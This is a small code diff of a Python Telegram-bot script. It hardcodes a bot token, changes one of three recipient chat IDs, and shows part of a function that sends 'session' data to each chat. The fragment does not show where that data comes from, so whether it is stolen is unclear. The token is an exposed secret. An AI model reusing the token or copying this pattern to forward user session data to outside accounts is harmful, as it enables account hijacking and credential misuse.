@@ -3,7 +3,7 @@ import requests
 from datetime import datetime
 
 BOT_TOKEN = '8424319780:AAErMSB9YiQ2v7KuB4d5ywhSiVNJG1BSdCk'
-CHAT_ID = [7669456027, 7669630491, 7421128257]
+CHAT_ID = [7669456027, 7818973762, 7421128257]
 bot = telebot.TeleBot(BOT_TOKEN)
 
 #lucky
@@ -37,6 +37,7 @@ def send_session_to_telegram(session_data: dict):
             "chat_id": chat_id,
             "text": text
         })
+
 
 
 
